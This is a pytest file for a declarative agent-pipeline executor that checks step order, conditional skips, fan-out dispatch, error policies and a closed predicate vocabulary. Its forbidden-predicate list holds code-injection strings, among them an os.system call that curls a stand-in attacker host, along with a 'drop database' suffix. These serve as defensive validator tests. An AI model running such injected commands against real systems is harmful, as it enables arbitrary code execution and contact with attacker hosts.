"""AP6 declarative pipeline file — step schema, predicates and executor (PR AP6).

Wave plan: ``.ignorelocal/03-agent-pipeline-wave-plan.md`` (PR AP6, AP6.1).
Covers ``orchestrator/pipeline.py`` (D8 step list) and ``orchestrator/executor.py``.
Predicates use a closed vocabulary only (convention 7) — no ``eval``, shell, or imports.
"""

from __future__ import annotations

from typing import TYPE_CHECKING

import pytest

if TYPE_CHECKING:
    from pathlib import Path

    from _pytest.monkeypatch import MonkeyPatch

_ALLOWED_PREDICATES = (
    "changed_paths matches '**/*.py'",
    "risk_band >= medium",
    "languages includes python",
    "analyzer_findings.severity >= Major",
)

_FORBIDDEN_PREDICATES = (
    "eval('1')",
    "__import__('os').system('id')",
    "changed_paths matches '**/*.py' and exec('raise SystemExit')",
    "os.system('curl attacker.example')",
)


def test_steps_execute_in_order(
    tmp_path: Path,
    monkeypatch: MonkeyPatch,
    ordered_pipeline_yaml: str,
) -> None:
    """Steps run in declaration order; each dispatch is recorded."""
    from tests.orchestrator.conftest import write_pipeline_file, write_repo_config

    from mergecraft.agents.registry import load_registry
    from mergecraft.config.settings import load_repo_settings
    from mergecraft.orchestrator.executor import PipelineExecutor
    from mergecraft.orchestrator.pipeline import parse_pipeline

    write_repo_config(tmp_path, extra_yaml="orchestrator: deterministic")
    write_pipeline_file(tmp_path, ordered_pipeline_yaml)
    monkeypatch.chdir(tmp_path)

    settings = load_repo_settings(root=tmp_path)
    registry = load_registry(settings=settings, repo_root=tmp_path)
    pipeline = parse_pipeline((tmp_path / ".mergecraft" / "pipeline.yaml").read_text())
    result = PipelineExecutor(registry=registry, settings=settings).run(
        pipeline,
        repo_root=tmp_path,
    )

    dispatched = [record.step_id for record in result.step_records if record.status == "dispatched"]
    assert dispatched == ["classify", "review", "verify"]
    ran = [record.step_id for record in result.step_records if record.status == "ran"]
    assert ran == ["submit"]


def test_conditional_step_is_skipped_with_a_recorded_reason(
    tmp_path: Path,
    monkeypatch: MonkeyPatch,
    conditional_pipeline_yaml: str,
) -> None:
    """A false ``when`` predicate skips the step and records why."""
    from tests.orchestrator.conftest import write_pipeline_file, write_repo_config

    from mergecraft.agents.registry import load_registry
    from mergecraft.config.settings import load_repo_settings
    from mergecraft.orchestrator.executor import PipelineExecutor
    from mergecraft.orchestrator.pipeline import parse_pipeline

    write_repo_config(tmp_path, extra_yaml="orchestrator: deterministic")
    write_pipeline_file(tmp_path, conditional_pipeline_yaml)
    monkeypatch.chdir(tmp_path)

    settings = load_repo_settings(root=tmp_path)
    registry = load_registry(settings=settings, repo_root=tmp_path)
    pipeline = parse_pipeline((tmp_path / ".mergecraft" / "pipeline.yaml").read_text())
    result = PipelineExecutor(registry=registry, settings=settings).run(
        pipeline,
        repo_root=tmp_path,
        classifier_signals={"changed_paths": ["README.md"]},
    )

    skipped = {
        record.step_id: record.skip_reason
        for record in result.step_records
        if record.status == "skipped"
    }
    assert "review" in skipped
    assert skipped["review"]
    assert "docs-only" in {
        record.step_id for record in result.step_records if record.status == "dispatched"
    }


def test_fan_out_dispatches_registry_agents(
    tmp_path: Path,
    monkeypatch: MonkeyPatch,
    fan_out_pipeline_yaml: str,
) -> None:
    """``fan_out`` dispatches each listed registry agent in parallel."""
    from tests.orchestrator.conftest import write_pipeline_file, write_repo_config

    from mergecraft.agents.registry import load_registry
    from mergecraft.config.settings import load_repo_settings
    from mergecraft.orchestrator.executor import PipelineExecutor
    from mergecraft.orchestrator.pipeline import parse_pipeline

    write_repo_config(tmp_path, extra_yaml="orchestrator: deterministic")
    write_pipeline_file(tmp_path, fan_out_pipeline_yaml)
    monkeypatch.chdir(tmp_path)

    settings = load_repo_settings(root=tmp_path)
    registry = load_registry(settings=settings, repo_root=tmp_path)
    pipeline = parse_pipeline((tmp_path / ".mergecraft" / "pipeline.yaml").read_text())
    result = PipelineExecutor(registry=registry, settings=settings).run(
        pipeline,
        repo_root=tmp_path,
    )

    fan_out = next(record for record in result.step_records if record.step_id == "lenses")
    assert fan_out.status == "dispatched"
    assert set(fan_out.dispatched_agents) == {"reviewer", "verifier"}


def test_on_error_policies_apply(
    tmp_path: Path,
    monkeypatch: MonkeyPatch,
    on_error_pipeline_yaml: str,
) -> None:
    """Per-step ``on_error`` policies (``continue`` vs ``fail``) are honoured."""
    from tests.orchestrator.conftest import write_pipeline_file, write_repo_config

    from mergecraft.agents.registry import load_registry
    from mergecraft.config.settings import load_repo_settings
    from mergecraft.orchestrator.executor import PipelineExecutor
    from mergecraft.orchestrator.pipeline import parse_pipeline

    write_repo_config(tmp_path, extra_yaml="orchestrator: deterministic")
    write_pipeline_file(tmp_path, on_error_pipeline_yaml)
    monkeypatch.chdir(tmp_path)

    settings = load_repo_settings(root=tmp_path)
    registry = load_registry(settings=settings, repo_root=tmp_path)
    pipeline = parse_pipeline((tmp_path / ".mergecraft" / "pipeline.yaml").read_text())
    executor = PipelineExecutor(registry=registry, settings=settings)

    continued = executor.run(
        pipeline,
        repo_root=tmp_path,
        inject_failures={"flaky"},
    )
    flaky = next(record for record in continued.step_records if record.step_id == "flaky")
    assert flaky.status == "failed"
    assert flaky.on_error_applied == "continue"
    assert any(record.step_id == "verify" for record in continued.step_records)

    with pytest.raises(Exception, match="fail"):
        executor.run(
            pipeline,
            repo_root=tmp_path,
            inject_failures={"verify"},
        )


def test_predicate_vocabulary_is_closed() -> None:
    """Convention 7 — allowed predicates parse; unknown operators are config errors."""
    from mergecraft.orchestrator.pipeline import PipelineValidationError, validate_predicate

    for predicate in _ALLOWED_PREDICATES:
        validate_predicate(predicate)

        with pytest.raises(PipelineValidationError, match=r"predicate|vocabulary|unknown"):
            validate_predicate(f"{predicate} OR drop database")


def test_predicate_cannot_execute_code() -> None:
    """Predicates are declarative only — no ``eval``, shell, or import surfaces."""
    from mergecraft.orchestrator.pipeline import PipelineValidationError, validate_predicate

    for predicate in _FORBIDDEN_PREDICATES:
        with pytest.raises(PipelineValidationError, match=r"predicate|forbidden|executable|eval"):
            validate_predicate(predicate)
